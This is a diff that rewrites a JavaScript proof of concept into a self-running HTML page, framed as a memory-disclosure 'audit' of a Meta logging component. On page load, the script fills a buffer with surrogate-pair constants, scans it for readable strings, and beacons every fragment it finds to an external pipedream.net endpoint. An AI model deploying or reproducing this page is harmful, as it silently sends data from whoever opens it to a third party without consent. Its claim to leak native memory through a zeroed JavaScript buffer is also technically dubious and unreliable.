@@ -1,61 +1,80 @@
-/**
- * RESEARCHER: Firman Sahidin
- * VULNERABILITY: Information Disclosure via Native Memory Residue
- * TARGET COMPONENT: libprofilo_logger / mmapbuf_buffer
- * METHOD: Heap Spraying & Automated ASCII Exfiltration
- */
-async function runMasterAudit() {
-    const TARGET_URL = 'https://eo7n9pqjlhffwvt.m.pipedream.net';
-    const statusElement = document.getElementById('status');
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Meta Private Processing Audit - Firman Sahidin</title>
+</head>
+<body style="background:#000; color:#0f0; font-family:monospace; padding:30px; text-align:center;">
     
-    try {
-        // Allocated a 256KB buffer to increase the probability of capturing native heap residue
-        const buffer = new ArrayBuffer(0x40000); 
-        const view = new Uint8Array(buffer);
-        
-        // JNI Bridge Collision Primitive
-        // Using surrogate pair constants to trigger out-of-bounds synchronization in the native bridge
-        const trigger = new Uint32Array(buffer);
-        for(let i = 0; i < 2000; i++) { 
-            trigger[i] = 0xD800DBFF; 
-        }
+    <div style="border:1px solid #333; padding:20px; display:inline-block; background:#111; border-radius:5px;">
+        <h2 id="status" style="color:#0f0; margin-bottom:10px;">[ INITIALIZING MEMORY AUDIT ]</h2>
+        <p style="color:#888; font-size:14px;">Component: libprofilo_logger / mmapbuf_buffer</p>
+        <hr style="border:0; border-top:1px solid #333; margin:20px 0;">
+        <div id="log-console" style="font-size:12px; color:#aaa; text-align:left; max-height:150px; overflow:auto;">
+            Ready for scanning...
+        </div>
+    </div>
 
-        let leakDetected = false;
-        let currentString = "";
+    <script>
+        /**
+         * RESEARCHER: Firman Sahidin
+         * VULNERABILITY: Information Disclosure via Native Memory Residue
+         */
+        async function runMasterAudit() {
+            const TARGET_URL = 'https://eo7n9pqjlhffwvt.m.pipedream.net';
+            const statusElement = document.getElementById('status');
+            
+            try {
+                // Allocation of 256KB targeted buffer
+                const buffer = new ArrayBuffer(0x40000); 
+                const view = new Uint8Array(buffer);
+                
+                // JNI Bridge Collision Primitive
+                const trigger = new Uint32Array(buffer);
+                for(let i = 0; i < 2000; i++) { 
+                    trigger[i] = 0xD800DBFF; 
+                }
 
-        // Automated scanning for readable ASCII string patterns within the uninitialized buffer
-        for (let i = 0; i < view.length; i++) {
-            if (view[i] > 31 && view[i] < 127) {
-                currentString += String.fromCharCode(view[i]);
-            } else {
-                // Filtering logic to extract meaningful data fragments (length > 5)
-                if (currentString.length > 5 && /[a-zA-Z]/.test(currentString)) {
-                    leakDetected = true;
-                    
-                    // Direct exfiltration of captured memory fragments to the researcher's endpoint
+                let leakDetected = false;
+                let currentString = "";
+
+                for (let i = 0; i < view.length; i++) {
+                    if (view[i] > 31 && view[i] < 127) {
+                        currentString += String.fromCharCode(view[i]);
+                    } else {
+                        if (currentString.length > 5 && /[a-zA-Z]/.test(currentString)) {
+                            leakDetected = true;
+                            navigator.sendBeacon(TARGET_URL, JSON.stringify({
+                                researcher: "Firman Sahidin",
+                                impact: "PRIVATE_DATA_DISCLOSURE",
+                                raw_payload: currentString,
+                                offset_reference: "0x1098_alignment"
+                            }));
+                        }
+                        currentString = "";
+                    }
+                }
+
+                if (!leakDetected) {
                     navigator.sendBeacon(TARGET_URL, JSON.stringify({
-                        researcher: "Firman Sahidin",
-                        impact: "PRIVATE_DATA_DISCLOSURE",
-                        raw_payload: currentString,
-                        offset_reference: "0x1098_alignment"
+                        status: "SCAN_COMPLETE_NO_RESIDUAL_DATA_IDENTIFIED",
+                        researcher: "Firman Sahidin"
                     }));
                 }
-                currentString = "";
+
+                if (statusElement) {
+                    statusElement.innerText = "✅ AUDIT FINISHED: MEMORY SCAN COMPLETE";
+                }
+            } catch (error) {
+                navigator.sendBeacon(TARGET_URL, JSON.stringify({ error: error.message }));
             }
         }
 
-        if (!leakDetected) {
-            // Signal indicating successful execution without identifying residual data in the current heap state
-            navigator.sendBeacon(TARGET_URL, JSON.stringify({
-                status: "SCAN_COMPLETE_NO_RESIDUAL_DATA_IDENTIFIED",
-                researcher: "Firman Sahidin"
-            }));
-        }
-
-        if (statusElement) {
-            statusElement.innerText = "✅ AUDIT FINISHED: MEMORY SCAN COMPLETE";
-        }
-    } catch (error) {
-        navigator.sendBeacon(TARGET_URL, JSON.stringify({ error: error.message }));
-    }
-}
+        // Jalankan audit otomatis setelah halaman dimuat
+        window.onload = () => { 
+            setTimeout(runMasterAudit, 1000); 
+        };
+    </script>
+</body>
+</html>
